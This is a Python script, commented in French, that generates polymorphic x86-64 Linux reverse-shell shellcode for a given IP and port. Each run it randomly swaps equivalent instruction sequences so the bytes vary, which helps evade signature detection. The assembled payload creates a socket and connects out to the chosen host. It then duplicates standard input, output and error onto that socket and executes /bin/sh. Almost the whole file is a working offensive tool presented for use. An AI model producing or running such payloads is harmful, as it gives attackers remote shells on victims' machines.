import argparse
import sys
import random



# Ajout de 01 pour une ip avec 0 en octet, et ajout de la suppression de 01 dans le code.
def adjust_ip_hex(ip_address):
    # Séparer l'adresse IP en octets et ajuster chaque octet
    adjusted_ip_bytes = [(int(octet) + 1) % 256 for octet in ip_address.split('.')]
    # Convertir chaque octet ajusté en hexadécimal et le formater pour le shellcode
    adjusted_ip_hex = ''.join(f"\\x{byte:02x}" for byte in adjusted_ip_bytes)
    return "\\x50\\xc7\\x44\\x24\\x04" + adjusted_ip_hex + "\\x48\\x8b\\x44\\x24\\x04\\xfe\\xc8\\xfe\\xcc\\xfe\\x4c\\x24\\x06\\xfe\\x4c\\x24\\x07\\x58"

# push + ip
def ip_to_shellcode_format(ip_address):
    # Séparer l'adresse IP en octets
    octets = ip_address.split('.')
    
    # Vérifier s'il y a un octet entièrement égal à zéro et lever une exception le cas échéant
    if '0' in octets:
        return adjust_ip_hex(ip_address)
        # raise ValueError("L'adresse IP contient un octet égal à 0, ce qui n'est pas autorisé.")

    # Convertir chaque octet en une chaîne d'échappement hexadécimale et les concaténer
    shellcode_ip = ''.join(f"\\x{int(octet):02x}" for octet in octets)

    return "\\xc7\\x44\\x24\\x04"+shellcode_ip

def port_to_shellcode(port):
    if not 1024 <= port <= 65535:
        raise ValueError("Le port doit être entre 1024 et 65535")

    # Convertir le port en bytes en little-endian
    port_bytes = port.to_bytes(2, 'big')

    # Convertir chaque octet en sa représentation de chaîne d'échappement
    shellcode_port = ''.join(f"\\x{byte:02x}" for byte in port_bytes)

    return f"\\xc7\\x04\\x24\\x02\\x09{shellcode_port}\\x81\\x24\\x24\\xff\\xf0\\xff\\xff"


def gen_shellcode(ip_adress, port) :
    
    
    xor_rax_rax = [
        "\\x48\\x31\\xC0",  # xor rax,rax
        "\\x48\\x29\\xC0",   # sub rax,rax
        "\\x53\\x48\\x31\\xDB\\x48\\x89\\xD8\\x5B", # push rbx; xor rbx, rbx; mov rax, rbx; pop rbx
        "\\x51\\x48\\x29\\xC9\\x48\\x89\\xC8\\x59", # push rcx; sub rcx, rcx; mov rax, rcx; pop rcx
        "\\x52\\x48\\x31\\xD2\\x48\\x89\\xD0\\x5A"  # push rdx; xor rdx, rdx; mov rax, rdx; pop rdx
    ]

    xor_rbx_rbx = [
        "\\x48\\x31\\xDB",  # xor rbx,rbx
        "\\x48\\x29\\xDB",   # sub rbx,rbx
        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC3\\x58", # push rax; xor rax, rax; mov rbx, rax; pop rax
        "\\x51\\x48\\x29\\xC9\\x48\\x89\\xCB\\x59", # push rcx; sub rcx, rcx; mov rbx, rcx; pop rcx
        "\\x52\\x48\\x29\\xD2\\x48\\x31\\xD2\\x48\\x89\\xD3\\x5A"   # push rdx; sub rdx, rdx; xor rdx, rdx; mov rbx, rdx; pop rdx
    ]

    xor_rcx_rcx = [
        "\\x48\\x31\\xC9"  # xor rcx,rcx
        "\\x48\\x29\\xC9",   # sub rcx,rcx
        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC1\\x58",   # push rax; xor rax, rax; mov rcx, rax; pop rax
        "\\x53\\x48\\x29\\xDB\\x48\\x89\\xD9\\x5B",   # push rbx; sub rbx, rbx; mov rcx, rbx; pop rbx
        "\\x52\\x48\\x29\\xD2\\x48\\x31\\xD2\\x48\\x89\\xD1\\x5A"   # push rdx; sub rdx, rdx; xor rdx, rdx; mov rcx, rdx; pop rdx

    ]

    xor_rdx_rdx = [
        "\\x48\\x31\\xD2",  # xor rdx,rdx
        "\\x48\\x29\\xD2",   # xor rdx,rdx
        "\\x50\\x48\\x31\\xC0\\x48\\x89\\xC2\\x58",   # push rax;xor rax, rax;mov rdx, rax;pop rax
        "\\x53\\x48\\x29\\xDB\\x48\\x89\\xDA\\x5B",   # push rbx;sub rbx, rbx;mov rdx, rbx;pop rbx
        "\\x51\\x48\\x29\\xC9\\x48\\x31\\xC9\\x48\\x89\\xCA\\x59"   # push rcx; sub rcx, rcx; xor rcx, rcx; mov rdx, rcx; pop rcx

    ]

    xor_rsi_rsi = [
        "\\x48\\x31\\xF6",  # xor rsi,rsi
        "\\x48\\x29\\xF6"   # sub rsi,rsi
    ]
    xor_rdi_rdi = [
        "\\x48\\x31\\xFF",  # xor rdi,rdi
        "\\x48\\x29\\xFF"   # sub rdi,rdi
    ]

    push_rbp = [
        "\\x55" # push rbp
    ]
    mov_rsp_rbp = [
        "\\x48\\x89\\xe5",                      # mov rbp,rsp
        "\\x54\\x5D",                           # push rsp; pop rbp
        "\\x48\\x89\\xE0\\x48\\x89\\xC5"       # mov rax,rsp; mov rbp,rax
    ]

    push_1_pop_rsi = [
        "\\x6a\\x01\\x5e"   # push 1; pop rsi
    ]
    push_2_pop_rdi = [
        "\\x6a\\x02\\x5f"   # push 2; pop rdi
    ]
    push_41_pop_rax = [
        "\\x6a\\x29\\x58"   # push 41; pop rax
    ]
    sub_rsp_8 = [
        "\\x48\\x83\\xec\\x08", # sub rsp,0x8
        "\\x48\\x83\\xEC\\x04\\x48\\x83\\xEC\\x04", # sub rsp,0x4; sub rsp,0x4
        "\\x48\\x83\\xEC\\x03\\x48\\x83\\xEC\\x02\\x48\\x83\\xEC\\x01\\x48\\x83\\xEC\\x02" # sub rsp,0x3; sub rsp,0x2, sub rsp,0x1, sub rsp,0x2
    ]
    lea_rsi_rsp = [
        "\\x48\\x8d\\x34\\x24",  # lea rsi,[rsp]
        "\\x48\\x89\\xe6" # mov rsi, rsp
    ]
    add_rsp_8 = [
        "\\x48\\x83\\xc4\\x08", # add rsp, 8
        "\\x48\\x83\\xC4\\x04\\x48\\x83\\xC4\\x04" # add rsp, 4; add rsp, 4
    ]

    pop_rbx_xor_rbx_rbx = [
        "\\x5b\\x48\\x31\\xdb",  # pop rbx; xor rbx, rbx
        "\\x48\\x89\\xC3\\x58\\x48\\x89\\xD8\\x48\\x31\\xDB",   # mov rbx, rax; pop rax; mov rax, rbx; xor rbx, rbx
        "\\x48\\x89\\xC3\\x58\\x48\\x89\\xD8\\x48\\x29\\xDB"    # mov rbx, rax; pop rax; mov rax, rbx; sub rbx, rbx
    ]

    mov_dl_16 = [
        "\\x6a\\x10\\x5a",  # push 16; pop rdx
        "\\xB2\\x10"    # mov dl, 16
    ]
    push_3_pop_rdi = [
        "\\x6a\\x03\\x5f"   # push 3; pop rdi
    ]
    mov_al_42 = [
        "\\x6a\\x2a\\x58",  # push 42; pop rax
        "\\xb0\\x2a"    # mov al, 42
    ]

    mov_al_33 = [
        "\\xb0\\x21"   # mov al, 33
    ]
    inc_rsi = [
        "\\x48\\xff\\xc6"  # inc rsi
    ]
    cmp_rsi_2 = [
        "\\x48\\x83\\xfe\\x02"  # cmp rsi, 2
    ]
    jle_shell_loop = [
        "\\x7e\\xf3"   # jle shell_loop
    ]
    mov_rdi_0x68732f6e69622f2f = [
        "\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"    # mov rdi, 0x68732f6e69622f2f
    ]
    push_rsi = [
        "\\x56" # push rsi
    ]
    push_rdi = [
        "\\x57" # push rdi
    ]
    mov_rdi_rsp = [
        "\\x48\\x89\\xe7"   # mov rdi, rsp
    ]
    mov_al_59 =[
        "\\xb0\\x3b",           # mov al, 59
        "\\xB0\\x28\\x04\\x13", # mov al, 40; add al, 19
        "\\xB0\\x1E\\x04\\x1D" # mov al, 30; add al, 29
    ]

    # code += liste1[random.randint(1,int(len(liste1))-1)]

    shellcodeF = ""
    shellcodeF += xor_rax_rax[random.randint(0,int(len(xor_rax_rax))-1)] # xor rax, rax
    shellcodeF += xor_rbx_rbx[random.randint(0,int(len(xor_rbx_rbx))-1)] # xor rbx, rbx
    shellcodeF += xor_rcx_rcx[random.randint(0,int(len(xor_rcx_rcx))-1)] # xor rcx, rcx
    shellcodeF += xor_rdx_rdx[random.randint(0,int(len(xor_rdx_rdx))-1)] # xor rdx, rdx
    shellcodeF += xor_rsi_rsi[random.randint(0,int(len(xor_rsi_rsi))-1)] # xor rsi, rsi
    shellcodeF += xor_rdi_rdi[random.randint(0,int(len(xor_rdi_rdi))-1)] # xor rdi, rdi
    shellcodeF += push_rbp[random.randint(0,int(len(push_rbp))-1)] # push %rbp
    shellcodeF += mov_rsp_rbp[random.randint(0,int(len(mov_rsp_rbp))-1)] # mov %rsp, %rbp
    shellcodeF += xor_rdx_rdx[random.randint(0,int(len(xor_rdx_rdx))-1)] # xor %rdx, rdx
    shellcodeF += push_1_pop_rsi[random.randint(0,int(len(push_1_pop_rsi))-1)] # push $0*1 pop %rsi
    shellcodeF += push_2_pop_rdi[random.randint(0,int(len(push_2_pop_rdi))-1)] # push $0*2 pop %rdi
    shellcodeF += push_41_pop_rax[random.randint(0,int(len(push_41_pop_rax))-1)] # push $0*29 pop %rax
    shellcodeF +="\\x0f\\x05" # syscall 
    shellcodeF += sub_rsp_8[random.randint(0,int(len(sub_rsp_8))-1)] # sub $0*8,%rsp
    shellcodeF += port_to_shellcode(port) # movl $0x5c110002,(%rsp) ;Port
    shellcodeF += ip_to_shellcode_format(ip_adress) # movl $0x801a8c0,0x4(%rsp) ;IP
    shellcodeF += lea_rsi_rsp[random.randint(0,int(len(lea_rsi_rsp))-1)] # lea (%rsp),%rsi
    shellcodeF += add_rsp_8[random.randint(0,int(len(add_rsp_8))-1)] # add $0x8,%rsp
    shellcodeF += pop_rbx_xor_rbx_rbx[random.randint(0,int(len(pop_rbx_xor_rbx_rbx))-1)] # pop %rbx xor %rbx,%rbx
    shellcodeF += mov_dl_16[random.randint(0,int(len(mov_dl_16))-1)] # push 16 pop rdx
    shellcodeF += push_3_pop_rdi[random.randint(0,int(len(push_3_pop_rdi))-1)] # push $0x3 pop %rdi
    shellcodeF += mov_al_42[random.randint(0,int(len(mov_al_42))-1)] # push $0x2a pop %rax
    shellcodeF +="\\x0f\\x05" # syscall
    shellcodeF += xor_rsi_rsi[random.randint(0,int(len(xor_rsi_rsi))-1)] # xor %rsi,%rsi
    shellcodeF += mov_al_33[random.randint(0,int(len(mov_al_33))-1)] # mov $0x21,%al
    shellcodeF +="\\x0f\\x05" # syscall
    shellcodeF += inc_rsi[random.randint(0,int(len(inc_rsi))-1)] # inc %rsi
    shellcodeF += cmp_rsi_2[random.randint(0,int(len(cmp_rsi_2))-1)] # cmp $0x2,%rsi
    shellcodeF += jle_shell_loop[random.randint(0,int(len(jle_shell_loop))-1)] # jle 40103f <shell_loop>
    shellcodeF += xor_rax_rax[random.randint(0,int(len(xor_rax_rax))-1)] # xor %rax,%rax
    shellcodeF += xor_rsi_rsi[random.randint(0,int(len(xor_rsi_rsi))-1)] #xor %rsi, %rsi
    shellcodeF += mov_rdi_0x68732f6e69622f2f[random.randint(0,int(len(mov_rdi_0x68732f6e69622f2f))-1)] # movabs $0x68732f6e69622f2f,%rdi
    shellcodeF += push_rsi[random.randint(0,int(len(push_rsi))-1)] # push %rsi
    shellcodeF += push_rdi[random.randint(0,int(len(push_rdi))-1)] # push %rdi
    shellcodeF += mov_rdi_rsp[random.randint(0,int(len(mov_rdi_rsp))-1)] # mov %rsp,%rdi
    shellcodeF += xor_rdx_rdx[random.randint(0,int(len(xor_rdx_rdx))-1)] # xor %rdx,%rdx
    shellcodeF += mov_al_59[random.randint(0,int(len(mov_al_59))-1)] # mov $0x3b,%al
    shellcodeF +="\\x0f\\x05" # syscall

    return(shellcodeF)
    # print(shellcodeF)
    # print(f"Shellcode length : {len(shellcodeF)}")


    

def main():
    parser = argparse.ArgumentParser(description="Generateur de Shellcode")
    parser.add_argument('-i', '--ip', help='ip Cible', required=True)
    parser.add_argument('-p', '--port', type=int, help='Port Cible', required=True)
    parser.add_argument('-w', '--windows', action='store_true', help='Pour une victime Windows')
    parser.add_argument('-c', '--chiffrement', action='store_true', help='Pour offusquer le code')
    options = parser.parse_args()

    ip_cible = options.ip
    port_cible = options.port

    print(f"IP Cible: {ip_cible}, Port Cible: {port_cible}")
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    print(gen_shellcode(ip_cible, port_cible))
    print(f"Shellcode length : {gen_shellcode(ip_cible, port_cible).count('x')}")
    

main()
